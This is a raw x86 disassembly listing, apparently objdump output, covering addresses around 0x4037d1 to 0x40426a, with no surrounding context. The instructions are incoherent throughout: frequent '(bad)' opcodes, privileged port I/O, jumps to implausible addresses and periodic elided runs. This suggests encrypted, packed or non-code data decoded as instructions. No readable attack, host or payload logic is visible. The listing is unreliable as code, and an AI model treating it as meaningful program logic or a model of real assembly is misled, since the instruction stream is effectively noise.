  4037d1:	add    edi,DWORD PTR [esi]
  4037d3:	pop    ebx
  4037d4:	jmp    0xe9df3397
  4037d9:	add    edi,DWORD PTR [esi]
  4037db:	pop    ebx
  4037dc:	jb     0x40382e
  4037de:	inc    esi
  4037df:	sar    bl,1
  4037e1:	mov    BYTE PTR [ebx],al
  4037e3:	mov    ds:0x9c3c6a39,eax
  4037e8:	cmp    al,0xf8
  4037ea:	jns    0x403812
  4037ec:	shl    esi,0xeb
  4037ef:	push   edx
  4037f0:	mov    dh,0x51
  4037f2:	push   edx
  4037f3:	shl    BYTE PTR [esp+edi*8],1
  4037f6:	ja     0x403791
  4037f8:	in     eax,dx
  4037f9:	add    esi,ebx
  4037fb:	iret   
  4037fc:	lea    eax,[edx+0x5c39a37a]
  403802:	(bad)  
  403803:	mov    ?,ecx
  403805:	inc    ebx
  403806:	mov    ds:0x9bfd04fb,eax
  40380c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40380d:	inc    eax
  40380e:	ss pop ebx
  403810:	add    cl,ch
	...
  40383a:	add    BYTE PTR [eax],al
  40383c:	cmp    eax,0x2624c75b
  403841:	pop    ebx
  403842:	add    cl,ch
  403844:	cmp    eax,0xc4f155d0
  403849:	dec    eax
  40384a:	lea    ebp,[ebp+eax*1+0x8e86a0b]
  403851:	es cld 
  403853:	inc    esi
  403854:	outs   dx,BYTE PTR ds:[esi]
  403855:	mov    ds:0x9c45b4ff,eax
  40385a:	push   edx
  40385b:	(bad)  
  40385d:	and    eax,0x9bbc4108
  403862:	jmp    DWORD PTR [esi]
  403864:	ins    DWORD PTR es:[edi],dx
  403865:	rcl    BYTE PTR [ebp-0xf],1
  403868:	les    ecx,FWORD PTR [eax+0x6a]
  40386b:	jmp    0x953f93c7
  403870:	leave  
  403871:	fwait
  403872:	jne    0x403875
  403874:	mov    al,0x25
  403876:	or     dh,bh
  403878:	push   cs
  403879:	inc    edi
  40387a:	pop    eax
  40387b:	bound  ecx,QWORD PTR [esi]
  40387d:	mov    ds:0x60399403,eax
  403882:	rcr    BYTE PTR [edi-0x68],1
  403885:	jo     0x403847
  403887:	mov    al,0x7c
  403889:	push   edx
  40388a:	add    BYTE PTR [ecx-0x16ffa4c3],dl
  403890:	je     0x40382a
  403892:	or     cl,ch
  403894:	or     al,dl
  403896:	in     al,dx
  403897:	push   0x7e
  403899:	sahf   
  40389a:	push   eax
  40389b:	adc    edx,ebx
  40389d:	pop    edi
  40389e:	adc    DWORD PTR [ecx],ebp
	...
  4038c8:	add    BYTE PTR [eax],al
  4038ca:	cmp    ah,BYTE PTR [ebx-0x6481178e]
  4038d0:	call   DWORD PTR [edx+ebp*1]
  4038d3:	pushf  
  4038d4:	jne    0x4038b7
  4038d6:	push   ebp
  4038d7:	dec    DWORD PTR es:[esi+0xc04f4b]
  4038de:	cmp    bl,BYTE PTR [ebx+0x5f23c2c8]
  4038e4:	mov    edx,DWORD PTR [ebp+0x1f]
  4038e7:	in     al,0x12
  4038e9:	lea    ebx,[edx-0x6d]
  4038ec:	push   eax
  4038ed:	(bad)  
  4038ee:	cli    
  4038ef:	outs   dx,BYTE PTR ds:[esi]
  4038f0:	push   DWORD PTR [ebp+0x23]
  4038f3:	nop
  4038f4:	jne    0x4038fe
  4038f6:	jo     0x403925
  4038f8:	or     al,0x85
  4038fa:	push   edi
  4038fb:	pop    ss
  4038fc:	adc    ecx,DWORD PTR [ebx+0x453b92aa]
  403902:	pop    ss
  403903:	or     al,BYTE PTR [edi]
  403905:	mov    eax,0x5ed6
  40390a:	jl     0x4038a5
  40390c:	sub    al,al
  40390e:	sub    al,0x5d
  403910:	sub    eax,eax
  403912:	push   cs
  403913:	popf   
  403914:	or     al,0x0
  403916:	mov    ah,bl
  403918:	in     al,dx
  403919:	sbb    DWORD PTR [ebx],0xffffff93
  40391c:	push   esi
  40391d:	push   eax
  40391e:	fild   WORD PTR [esi]
  403920:	xchg   ebx,eax
  403921:	adc    edi,esp
  403923:	pop    esi
  403924:	clc    
  403925:	jb     0x4038bd
  403927:	fwait
  403928:	inc    DWORD PTR [ebx+0x74006212]
	...
  403956:	add    BYTE PTR [eax],al
  403958:	test   eax,0xa7087ddb
  40395d:	or     DWORD PTR [edi],eax
  40395f:	sub    edx,edi
  403961:	xor    cl,cl
  403963:	ret    0x5e63
  403966:	cmp    DWORD PTR [ebp-0x69],0x5e
  40396a:	jne    0x403976
  40396c:	mov    edi,0x5700005d
  403971:	xor    cl,cl
  403973:	ret    0x5e83
  403976:	mov    esi,DWORD PTR [ebp+0x53]
  403979:	xlat   BYTE PTR ds:[ebx]
  40397a:	inc    ebp
  40397b:	cld    
  40397c:	addr16 pop esi
  40397e:	add    BYTE PTR [eax],al
  403980:	ds std 
  403982:	dec    ebp
  403983:	or     BYTE PTR [ebp+0x3a458696],dh
  403989:	je     0x403980
  40398b:	jne    0x4039db
  40398d:	jb     0x403984
  40398f:	jne    0x4039c7
  403991:	adc    DWORD PTR [ecx+0x10],edx
  403994:	mov    ebx,0x65077ac3
  403999:	inc    esp
  40399a:	push   ebp
  40399b:	leave  
  40399c:	cld    
  40399d:	xchg   DWORD PTR [ebx],eax
  40399f:	or     DWORD PTR [ebx+0x39750330],0x5d
  4039a6:	les    ebx,FWORD PTR [esi+0x7]
  4039a9:	inc    esi
  4039aa:	pop    es
  4039ab:	add    ch,al
  4039ad:	mov    esi,0x5aee03f7
  4039b2:	aas    
  4039b3:	adc    BYTE PTR [ebx+0x40],ch
  4039b6:	mov    ebx,0x3843e01
  4039bb:	pop    esi
	...
  4039e4:	add    BYTE PTR [eax],al
  4039e6:	pop    es
  4039e7:	inc    esi
  4039e8:	pop    es
  4039e9:	add    BYTE PTR [ebx-0x3],dh
  4039ec:	out    0x81,al
  4039ee:	cli    
  4039ef:	imul   esp,esp,0xffffffff
  4039f2:	mov    ecx,0x4a685bf3
  4039f7:	mov    dh,0x43
  4039f9:	add    BYTE PTR [esi-0x5e3cfdeb],ah
  4039ff:	fld    QWORD PTR [ebx]
  403a01:	push   0x3e
  403a03:	cs pop es
  403a05:	push   0x3e
  403a07:	cs pop es
  403a09:	push   0x8003843e
  403a0e:	sub    DWORD PTR [esi],0xd32de7fc
  403a14:	add    al,0x0
  403a16:	(bad)  
  403a17:	ds lock inc eax
  403a1a:	xrelease xchg DWORD PTR [edx+eax*8+0x5d8436],edi
  403a22:	retf   
  403a23:	pop    edx
  403a24:	sub    al,0xec
  403a26:	out    dx,al
  403a27:	add    ch,cl
  403a29:	adc    edi,DWORD PTR [esi]
  403a2b:	pop    ebx
  403a2c:	mov    DWORD PTR fs:[esi-0x77],eax
  403a30:	mov    ?,ebx
  403a32:	mov    ds,WORD PTR [eax+0x6f26effc]
  403a38:	js     0x403a3e
  403a3a:	ds fs test eax,0xf4983079
  403a41:	out    dx,eax
  403a42:	imul   ebx,DWORD PTR es:[eax+0x4],0xbd29443e
	...
  403a72:	add    BYTE PTR [eax],al
  403a74:	cld    
  403a75:	arpl   cx,bp
  403a77:	repnz mov edx,DWORD PTR [ebx-0x770976a4]
  403a7e:	inc    esi
  403a7f:	repz mov ds,WORD PTR [eax+0x66e1ffb4]
  403a86:	ss repz loope 0x403a66
  403a8a:	lods   al,BYTE PTR ds:[esi]
  403a8b:	jmp    0x403acb
  403a8d:	push   cs
  403a8e:	gs repz dec ebx
  403a91:	xchg   edi,eax
  403a92:	adc    ebp,ebx
  403a94:	into   
  403a95:	pop    ebx
  403a96:	jmp    0xe99b7a46
  403a9b:	add    eax,DWORD PTR [edi+0xb03f19d]
  403aa1:	in     al,0xd
  403aa3:	push   esp
  403aa4:	push   es
  403aa5:	add    edx,DWORD PTR [eax+0x16]
  403aa8:	(bad)  
  403aa9:	pop    edx
  403aaa:	icebp  
  403aab:	jne    0x403aec
  403aad:	pushf  
  403aae:	out    0x5d,al
  403ab0:	cmp    al,0x5
  403ab2:	jmp    0xc1a34ea9
  403ab7:	xchg   ecx,eax
  403ab8:	sbb    DWORD PTR [eax+0x5f7cbcce],0xffffffe9
  403abf:	pop    eax
  403ac0:	lds    eax,FWORD PTR [edi-0x2d29b3e7]
  403ac6:	add    bl,bl
  403ac8:	std    
  403ac9:	pop    edx
  403aca:	clc    
  403acb:	cmp    eax,DWORD PTR [ebx-0x64]
  403ace:	call   DWORD PTR [ebx]
  403ad0:	cmp    al,BYTE PTR ds:0x62c69e00
  403ad6:	call   0x403af1
	...
  403aff:	add    BYTE PTR [eax],al
  403b01:	add    BYTE PTR [edi-0x68],cl
  403b04:	jmp    DWORD PTR [eax+0x1c005f03]
  403b0a:	mov    cl,0x87
  403b0c:	and    DWORD PTR [ebp+0x1582b15],0xfffffff0
  403b13:	ins    BYTE PTR es:[edi],dx
  403b14:	inc    eax
  403b15:	jmp    0x2a41483f
  403b1a:	or     al,0x98
  403b1c:	jne    0x403b0b
  403b1e:	mov    esp,0x762ef81d
  403b23:	xchg   edi,eax
  403b24:	add    cl,ch
  403b26:	cmp    eax,0xece96a5b
  403b2b:	or     eax,0x63663e0c
  403b30:	call   0xffd829db
  403b35:	bound  esi,QWORD PTR [esi+0x63]
  403b38:	mov    edi,ebx
  403b3a:	int3   
  403b3b:	or     eax,0x93461efc
  403b40:	call   FWORD PTR [ebp+eax*8-0x50ead68]
  403b47:	pushf  
  403b48:	or     cl,ch
  403b4a:	push   ss
  403b4b:	in     al,0xec
  403b4d:	cdq    
  403b4e:	cmc    
  403b4f:	add    bl,BYTE PTR [eax]
  403b51:	(bad)  
  403b53:	pop    edx
  403b54:	clc    
  403b55:	jnp    0x403b99
  403b57:	pushf  
  403b58:	call   DWORD PTR [ebx+0x3a]
  403b5b:	cwde   
  403b5c:	jne    0x403b4f
  403b5e:	gs sar bh,0xd6
  403b62:	(bad)  
  403b63:	mov    eax,ds:0xe5c2
	...
  403b90:	cmp    eax,0x8b008b2e
  403b95:	adc    eax,0x48d41455
  403b9a:	add    BYTE PTR [ebp+0x53],dh
  403b9d:	aam    0xc2
  403b9f:	adc    BYTE PTR [edi-0x76],ah
  403ba2:	jne    0x403bb4
  403ba4:	cwde   
  403ba5:	(bad)  
  403ba7:	push   DWORD PTR [edx]
  403ba9:	xchg   edi,eax
  403baa:	out    0xe6,eax
  403bac:	stos   BYTE PTR es:[edi],al
  403bad:	mov    edi,edi
  403baf:	mov    esi,DWORD PTR [edx+0x73]
  403bb2:	and    DWORD PTR [edx],eax
  403bb4:	out    dx,al
  403bb5:	popf   
  403bb6:	adc    BYTE PTR [eax],al
  403bb8:	push   edx
  403bb9:	sbb    ah,ch
  403bbb:	adc    ebx,0xffffff8b
  403bbe:	push   DWORD PTR [ebp-0x5]
  403bc1:	cmp    BYTE PTR [ecx*4-0xaf791e],al
  403bc8:	repnz xchg edx,eax
  403bca:	out    0xc3,eax
  403bcc:	push   0xa28bff8c
  403bd1:	xchg   esi,eax
  403bd2:	cmp    BYTE PTR [eax],0xe7
  403bd5:	push   cs
  403bd6:	pop    es
  403bd7:	mov    esp,DWORD PTR [edx+0x7cc80f86]
  403bdd:	pop    ebp
  403bde:	sub    eax,eax
  403be0:	push   ds
  403be1:	popf   
  403be2:	or     BYTE PTR [eax],al
  403be4:	xchg   edx,eax
  403be5:	pop    ss
  403be6:	in     al,dx
  403be7:	and    DWORD PTR [ebx],0xffffff8b
  403bea:	push   DWORD PTR [ebp-0x25]
  403bed:	cmp    BYTE PTR [edx],al
  403bef:	(bad)  
  403bf0:	loop   0x403b7e
  403bf2:	push   eax
  403bf3:	inc    DWORD PTR [eax]
	...
  403c1d:	add    BYTE PTR [edx],dh
  403c1f:	xchg   edx,eax
  403c20:	out    0x97,eax
  403c22:	test   al,0x8b
  403c24:	dec    DWORD PTR [ebx+0x388296d2]
  403c2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c2b:	push   cs
  403c2c:	or     BYTE PTR [edi],cl
  403c2e:	mov    al,0x1d
  403c30:	inc    BYTE PTR [esi+0x2b02b7e3]
  403c36:	les    edi,FWORD PTR ds:[edx+0x568446c2]
  403c3d:	mov    esp,DWORD PTR [edx+0x1]
  403c40:	(bad)  
  403c41:	cld    
  403c42:	imul   ecx,DWORD PTR [edi+0x0],0x45ff3f6a
  403c49:	(bad)  
  403c4a:	out    dx,al
  403c4b:	les    esi,FWORD PTR [esi+0x8]
  403c4e:	pushw  0xfff1
  403c51:	dec    DWORD PTR [ecx+0x9]
  403c54:	inc    esi
  403c55:	or     al,0xbd
  403c57:	lods   al,BYTE PTR ds:[esi]
  403c58:	add    esi,DWORD PTR [eax+eax*2-0x4b]
  403c5c:	mov    ecx,0x5e93145
  403c61:	sub    edi,esi
  403c63:	retf   0x8c5
  403c66:	ds ja  0x403ce6
  403c69:	in     al,dx
  403c6a:	lds    ebp,FWORD PTR [esi+0x14]
  403c6d:	adc    DWORD PTR [esp+eax*4+0x76],0x4
  403c72:	test   DWORD PTR [ecx-0x1],0xffb700ff
  403c79:	(bad)  
  403c7a:	jae    0x403cf8
  403c7c:	fcmovnbe st,st(0)
  403c7e:	repnz sbb al,0xf0
  403c81:	or     eax,DWORD PTR [eax]
	...
  403cab:	add    dh,bh
  403cad:	into   
  403cae:	cld    
  403caf:	mov    cl,BYTE PTR [ebx+0x3e02c8b4]
  403cb5:	test   BYTE PTR [ebx],al
  403cb7:	add    ch,ah
  403cb9:	mov    ds,WORD PTR [ebp+0x1]
  403cbc:	leave  
  403cbd:	out    dx,al
  403cbe:	(bad)  
  403cbf:	dec    BYTE PTR [ebx+0x7c]
  403cc2:	fstp   TBYTE PTR ds:0xc9f064ba
  403cc8:	jl     0x403c59
  403cca:	add    edx,DWORD PTR [ebp-0x4b]
  403ccd:	addr16 test ah,al
  403cd0:	mov    ds:0x4a757cf5,al
  403cd5:	fiadd  DWORD PTR [ebx]
  403cd7:	(bad)  
  403cd8:	sti    
  403cd9:	pop    edx
  403cda:	in     eax,0x54
  403cdc:	mov    DWORD PTR [edi],ecx
  403cde:	stc    
  403cdf:	push   ebp
  403ce0:	or     DWORD PTR [edi],0x8604dbe1
  403ce6:	jmp    0x3ddb81ee
  403ceb:	push   es
  403cec:	mov    ebp,0xeb04bd17
  403cf1:	pop    ebp
  403cf2:	add    al,ah
  403cf4:	clc    
  403cf5:	mov    ds:0xe23e00ab,eax
  403cfa:	sub    al,0xf0
  403cfc:	cmp    eax,0x2e48d08b
  403d01:	adc    BYTE PTR [edx-0x16a4c054],bh
  403d07:	add    edx,DWORD PTR [eax+0x3e00aba2]
  403d0d:	cs jb  0x403cf0
	...
  403d38:	add    BYTE PTR [eax],al
  403d3a:	mov    edi,0x19eef19f
  403d3f:	xchg   ebp,eax
  403d40:	sbb    bl,BYTE PTR [ebx]
  403d42:	cmc    
  403d43:	add    ecx,ebp
  403d45:	pop    ecx
  403d46:	ds add ebx,ebp
  403d49:	pop    ecx
  403d4a:	ds add edx,ebp
  403d4d:	pop    ebx
  403d4e:	ds pop ebx
  403d50:	jmp    0xf54f2f18
  403d55:	fucomi st,st(6)
  403d57:	test   ecx,ebp
  403d59:	add    esi,DWORD PTR [edi+0x5244351e]
  403d5f:	sub    BYTE PTR [esi],ch
  403d61:	jns    0x403da9
  403d63:	adc    esp,0xffffffed
  403d66:	leave  
  403d67:	xchg   esp,eax
  403d68:	es dec ecx
  403d6a:	(bad)  
  403d6b:	pop    ebx
  403d6c:	jmp    0xb5207b74
  403d71:	sti    
  403d72:	les    ebp,FWORD PTR [ecx+0x74]
  403d75:	dec    ecx
  403d76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d77:	sub    edx,DWORD PTR [ecx+0x5b3e83]
  403d7d:	jmp    0xeeb91c40
  403d82:	mov    al,ds:0x6e65094
  403d87:	arpl   di,di
  403d89:	cmp    edi,DWORD PTR [esi]
  403d8b:	fdivr  DWORD PTR [ebp-0x2f]
  403d8e:	cmp    eax,0x952a030e
  403d93:	jae    0x403d94
  403d95:	cmp    al,0x5a
  403d97:	out    0x85,al
  403d99:	inc    ecx
  403d9a:	push   ecx
  403d9b:	xchg   esp,eax
  403d9c:	call   FWORD PTR [ecx]
	...
  403dc6:	add    BYTE PTR [eax],al
  403dc8:	imul   ecx,DWORD PTR [esi],0x93eac1fc
  403dce:	jmp    DWORD PTR [esi-0x148b2bbc]
  403dd4:	fs (bad) 
  403dd6:	call   FWORD PTR [esi+ebp*1]
  403dd9:	and    DWORD PTR [ebx-0x74a4c281],0xffffffaa
  403de0:	je     0x403d84
  403de2:	ret    0x3df1
  403de5:	mov    eax,DWORD PTR cs:[ebp+0x6ef89ebc]
  403dec:	xchg   esi,eax
  403ded:	addr16 call 0xffd4527c
  403df3:	jo     0x403e6b
  403df5:	xchg   ebx,eax
  403df6:	(bad)  
  403df7:	lods   al,BYTE PTR ds:[esi]
  403df8:	jmp    0x3e293e57
  403dfd:	xchg   esp,eax
  403dfe:	jne    0x403df5
  403e00:	add    eax,0xd03efdd0
  403e05:	fist   WORD PTR [ebp-0x1b]
  403e08:	push   esp
  403e09:	imul   ebp,DWORD PTR [edx-0x17],0x9cff5b77
  403e10:	fst    DWORD PTR [ebx+0xdd02175]
  403e16:	or     BYTE PTR [esi],dl
  403e18:	ss addr16 (bad) 
  403e1b:	mov    ebx,0xc2a241
  403e20:	scas   eax,DWORD PTR es:[edi]
  403e21:	push   edi
  403e22:	push   ebp
  403e23:	mov    esi,DWORD PTR [ebx]
  403e25:	fld    st(4)
  403e27:	clc    
  403e28:	push   0xf823
	...
  403e55:	add    BYTE PTR [edi+0x5ac70057],ah
  403e5b:	mov    eax,DWORD PTR [eax]
  403e5d:	add    BYTE PTR [edi+0x5f558b57],dl
  403e63:	adc    dl,BYTE PTR [edx]
  403e65:	lea    ebx,[edx]
  403e67:	xchg   DWORD PTR [eax+0x6a],edx
  403e6a:	push   esi
  403e6b:	xchg   BYTE PTR [ebp-0x4],dh
  403e6e:	mov    al,ds:0x1afff80b
  403e73:	xchg   edi,eax
  403e74:	(bad)  
  403e75:	push   edx
  403e76:	imul   edx,DWORD PTR [edx],0x45
  403e79:	clc    
  403e7a:	mov    ds,WORD PTR [eax+0x120a0004]
  403e80:	in     al,dx
  403e81:	push   0x26
  403e83:	adc    al,BYTE PTR [ebp+0xc]
  403e86:	ja     0x403e08
  403e88:	jne    0x403e92
  403e8a:	iret   
  403e8b:	dec    esp
  403e8c:	cld    
  403e8d:	jmp    DWORD PTR [eax+0x2708c2d6]
  403e93:	sub    cl,BYTE PTR [ebx-0x729cc214]
  403e99:	inc    ebp
  403e9a:	adc    ebp,DWORD PTR [edi]
  403e9c:	push   DWORD PTR [ebp+0xf]
  403e9f:	mov    bh,0x1e
  403ea1:	cld    
  403ea2:	nop
  403ea3:	or     cl,0xc2
  403ea6:	fistp  WORD PTR [esi+0x55]
  403ea9:	mov    edx,DWORD PTR [ebx-0x28f38224]
  403eaf:	or     dl,BYTE PTR [ebx+eax*4]
  403eb2:	xchg   edx,eax
  403eb3:	outs   dx,BYTE PTR ds:[esi]
  403eb4:	add    BYTE PTR [ecx+esi*8+0x7f],dh
  403eb8:	jne    0x403eca
	...
  403ee2:	add    BYTE PTR [eax],al
  403ee4:	and    BYTE PTR [edx],cl
  403ee6:	or     al,0xff
  403ee8:	stos   BYTE PTR es:[edi],al
  403ee9:	xchg   esi,eax
  403eea:	out    0xfd,eax
  403eec:	ds ins DWORD PTR es:[edi],dx
  403eee:	in     eax,dx
  403eef:	inc    DWORD PTR [edi+0x13000046]
  403ef5:	or     eax,0xb42bffe0
  403efa:	in     al,dx
  403efb:	jne    0x403f43
  403efd:	pop    esp
  403efe:	mov    al,0xff
  403f00:	xchg   ecx,eax
  403f01:	add    DWORD PTR [eax+0x77842e7d],0x2fbd14
  403f0b:	add    dl,dh
  403f0d:	jns    0x403efb
  403f0f:	jne    0x403f5f
  403f11:	mov    eax,ds:0x4f690c76
  403f16:	cld    
  403f17:	out    0xa9,eax
  403f19:	shr    esp,1
  403f1b:	inc    DWORD PTR [edi-0x1500003a]
  403f21:	cld    
  403f22:	fiadd  WORD PTR [ebx+0x740387cb]
  403f28:	xor    al,0xf1
  403f2a:	jbe    0x403f38
  403f2c:	es fiadd WORD PTR ss:[eax]
  403f30:	fld    QWORD PTR ds:[ecx]
  403f33:	sub    edi,esi
  403f35:	jae    0x403f24
  403f37:	jne    0x403f6b
  403f39:	adc    DWORD PTR [esi+0x8],esi
  403f3c:	es push ebp
  403f3e:	in     al,dx
  403f3f:	call   DWORD PTR [ecx]
  403f41:	mov    ebx,0xcf3e08c1
  403f46:	js     0x403f34
	...
  403f70:	add    BYTE PTR [eax],al
  403f72:	add    DWORD PTR [edi+0x2921e7fb],esp
  403f78:	in     al,dx
  403f79:	dec    DWORD PTR [esi+0x1467fb9e]
  403f7f:	int3   
  403f80:	inc    edx
  403f81:	add    cl,ah
  403f83:	(bad)  
  403f84:	sti    
  403f85:	out    0x4d,eax
  403f87:	dec    ecx
  403f88:	in     al,dx
  403f89:	jmp    DWORD PTR [esp+eax*4-0x14]
  403f8d:	jne    0x403fc5
  403f8f:	pop    ebx
  403f90:	adc    DWORD PTR [edi-0x3f],edx
  403f93:	xchg   ecx,eax
  403f94:	push   ds
  403f95:	pop    ecx
  403f96:	cmp    al,0xe0
  403f98:	lods   al,BYTE PTR ds:[esi]
  403f99:	inc    DWORD PTR [ecx]
  403f9b:	xchg   edx,eax
  403f9c:	xchg   esp,eax
  403f9d:	sti    
  403f9e:	mov    eax,ds:0xa1ec0635
  403fa3:	add    al,0xeb
  403fa5:	jle    0x403faa
  403fa7:	imul   ebx,DWORD PTR [ecx+0x1630bec],0x3e
  403fae:	mov    DWORD PTR [ecx-0x6388b31a],edx
  403fb4:	in     eax,dx
  403fb5:	add    edx,DWORD PTR [ebx]
  403fb7:	out    0xc5,al
  403fb9:	xchg   DWORD PTR [edx-0x72],edi
  403fbc:	into   
  403fbd:	jno    0x403ff5
  403fbf:	sbb    DWORD PTR [ecx],0xffffffee
  403fc2:	popa   
  403fc3:	xchg   ecx,eax
  403fc4:	adc    al,BYTE PTR [ecx+0x4a]
  403fc7:	in     al,0x2c
  403fc9:	call   0xfc1d578b
  403fce:	xlat   BYTE PTR ds:[ebx]
  403fcf:	pop    edx
  403fd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fd1:	jno    0x404005
  403fd3:	xchg   edx,eax
  403fd4:	adc    al,0xfc
	...
  403ffe:	add    BYTE PTR [eax],al
  404000:	and    DWORD PTR [ebx+edx*4-0x15],ebx
  404004:	xor    DWORD PTR [ecx+0x729e814],edx
  40400a:	icebp  
  40400b:	fstp   TBYTE PTR ds:0x19eb7e90
  404011:	pop    es
  404012:	loope  0x403fef
  404014:	dec    edx
  404015:	(bad)  
  404016:	outs   dx,BYTE PTR ds:[esi]
  404017:	jmp    0x403fce
  404019:	push   ss
  40401a:	gs mov ebp,0x50e963fc
  404020:	lds    edi,FWORD PTR [edi+0x6a]
  404023:	shr    dl,0x98
  404026:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404027:	out    dx,eax
  404028:	ds pop ebx
  40402a:	jmp    0x3d56f332
  40402f:	push   esp
  404030:	fld    DWORD PTR [esi]
  404032:	add    cl,ah
  404034:	cmc    
  404035:	cmp    esi,ebp
  404037:	jmp    0xa2011679
  40403c:	es nop
  40403e:	jne    0x404031
  404040:	xchg   ebp,eax
  404041:	xchg   ebp,eax
  404042:	stc    
  404043:	push   ss
  404044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404045:	loop   0x40408c
  404047:	adc    DWORD PTR [ebp-0x7aee03fa],edx
  40404d:	jg     0x40404f
  40404f:	jmp    0xdfb510ec
  404054:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404055:	push   es
  404056:	clc    
  404057:	cdq    
  404058:	jmp    0x4040b4
  40405a:	call   0x9b7fb7
  40405f:	jo     0x40405f
  404061:	xchg   bh,bh
  404063:	pop    esp
	...
  40408c:	add    BYTE PTR [eax],al
  40408e:	sbb    bx,0xffbd
  404092:	cmp    eax,0x623cff5b
  404097:	js     0x404074
  404099:	ret    0x9064
  40409c:	mov    ebp,DWORD PTR [esi+ecx*2]
  40409f:	pusha  
  4040a0:	enter  0x6db6,0x2b
  4040a4:	call   FWORD PTR [edx+eax*2]
  4040a7:	js     0x40403b
  4040a9:	lahf   
  4040aa:	and    al,0x90
  4040ac:	leave  
  4040ad:	stos   DWORD PTR es:[edi],eax
  4040ae:	xor    DWORD PTR [eax-0x23ee9dac],edx
  4040b4:	les    edi,FWORD PTR [ecx-0x4]
  4040b7:	adc    eax,0x5b3de9f4
  4040bc:	add    BYTE PTR [esi+edi*2-0x71],ah
  4040c0:	push   eax
  4040c1:	outs   dx,BYTE PTR ds:[esi]
  4040c2:	mov    fs,WORD PTR [ebx-0x18]
  4040c5:	sub    esi,esp
  4040c7:	pop    edx
  4040c8:	add    BYTE PTR [ebp+edi*8+0x12],ah
  4040cc:	dec    ebp
  4040cd:	push   esi
  4040ce:	outs   dx,BYTE PTR ds:[esi]
  4040cf:	arpl   ax,bp
  4040d1:	jne    0x4040ad
  4040d3:	(bad)  
  4040d4:	inc    DWORD PTR [eax]
  4040d6:	outs   dx,BYTE PTR ds:[esi]
  4040d7:	sbb    edi,eax
  4040d9:	sbb    DWORD PTR [edx+0x3b720483],0xffffffd8
  4040e0:	ins    DWORD PTR es:[edi],dx
  4040e1:	clc    
  4040e2:	jecxz  0x404068
  4040e4:	jne    0x4040e2
  4040e6:	das    
  4040e7:	add    eax,0x90a700ec
  4040ec:	mov    edi,0x75849574
  4040f1:	clc    
	...
  40411a:	add    BYTE PTR [eax],al
  40411c:	out    0x2d,eax
  40411e:	add    al,ch
  404120:	xchg   esi,eax
  404121:	pop    edx
  404122:	add    BYTE PTR [eax],al
  404124:	test   al,0xd3
  404126:	not    eax
  404128:	push   ds
  404129:	sbb    esi,esp
  40412b:	call   DWORD PTR [edx]
  40412d:	js     0x404117
  40412f:	imul   edx,DWORD PTR [bp+0x0],0xffffffeb
  404134:	jno    0x4040b8
  404136:	jne    0x404140
  404138:	jg     0x404169
  40413a:	sti    
  40413b:	(bad)  
  40413c:	js     0x4041ab
  40413e:	ror    cl,0x95
  404141:	pop    edx
  404142:	add    bl,ch
  404144:	popa   
  404145:	outs   dx,BYTE PTR ds:[esi]
  404146:	ror    cl,0xa5
  404149:	pop    edx
  40414a:	add    BYTE PTR [edx+0x55],ch
  40414d:	sub    eax,0x8f22fffc
  404152:	out    0x4,eax
  404154:	fiadd  WORD PTR [edi+edi*8+0x18762c7]
  40415b:	add    BYTE PTR [edi],dl
  40415d:	pop    ebx
  40415e:	lea    eax,[ebp-0x59]
  404161:	daa    
  404162:	push   DWORD PTR [ebp+0xf]
  404165:	mov    bl,0xfa
  404167:	sti    
  404168:	mov    BYTE PTR [ebx+eax*4+0x7457877d],al
  40416f:	adc    cl,BYTE PTR [eax]
  404171:	sar    DWORD PTR [ebx],cl
  404173:	inc    ebp
  404174:	xchg   ebx,eax
  404175:	inc    BYTE PTR [esi]
  404177:	mov    eax,0x3833e
  40417c:	sbb    DWORD PTR ds:[edx],eax
  40417f:	sub    eax,DWORD PTR [eax]
	...
  4041a9:	add    dh,bh
  4041ab:	sub    DWORD PTR [esi],eax
  4041ad:	sub    edi,esi
  4041af:	dec    ebx
  4041b0:	mov    BYTE PTR [esi+edi*1],0xef
  4041b4:	jl     0x4041a2
  4041b6:	mov    ebp,0x7b8dec38
  4041bb:	cmp    BYTE PTR [edi+edi*8+0x33],dl
  4041bf:	mov    ebx,ds
  4041c1:	sbb    ah,BYTE PTR [ebx+0x7e850384]
  4041c7:	in     al,dx
  4041c8:	sbb    al,0xff
  4041ca:	sub    ecx,DWORD PTR [ebx+ebx*8-0x17726912]
  4041d1:	mov    ebx,edi
  4041d3:	mov    ebp,eax
  4041d5:	jne    0x404161
  4041d7:	pop    esp
  4041d8:	in     eax,0xeb
  4041da:	ds test ah,bh
  4041dd:	mov    edi,0x75e887f2
  4041e2:	inc    edx
  4041e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041e4:	outs   dx,BYTE PTR ds:[esi]
  4041e5:	clc    
  4041e6:	push   cs
  4041e7:	pushf  
  4041e8:	or     edi,DWORD PTR cs:[esi]
  4041eb:	test   al,ch
  4041ed:	jne    0x404249
  4041ef:	lods   al,BYTE PTR ds:[esi]
  4041f0:	shr    bl,cl
  4041f2:	ds test al,ch
  4041f5:	jne    0x40422d
  4041f7:	pushf  
  4041f8:	sar    dl,cl
  4041fa:	inc    ecx
  4041fb:	mov    ch,0xba
  4041fd:	ret    0x8446
  404200:	dec    esi
  404201:	mov    esp,DWORD PTR [edx]
  404203:	add    DWORD PTR [edi-0x33667218],edi
  404209:	lea    edi,[ebx-0x28]
  40420c:	push   ebx
  40420d:	inc    DWORD PTR [eax]
	...
  404237:	add    BYTE PTR [ebx+0x22cadb8c],dl
  40423d:	test   BYTE PTR [ebx],al
  40423f:	test   esi,edi
  404241:	lods   al,BYTE PTR ds:[esi]
  404242:	jnp    0x4041fb
  404244:	ds pop ebx
  404246:	jmp    0xf1483b4e
  40424b:	fcmovnbe st,st(4)
  40424d:	xchg   edx,eax
  40424e:	push   esi
  40424f:	call   0xe8955a0b
  404254:	imul   ecx,DWORD PTR [edi+0x5ae57851],0xffffffe9
  40425b:	cld    
  40425c:	xchg   ecx,eax
  40425d:	pop    ebp
  40425e:	ins    DWORD PTR es:[edi],dx
  40425f:	xchg   DWORD PTR [esi],edi
  404261:	pop    ebx
  404262:	jmp    0x26cbbde1
  404267:	outs   dx,BYTE PTR ds:[esi]
  404268:	mov    dl,0x82
  40426a:	jnp    0x404270
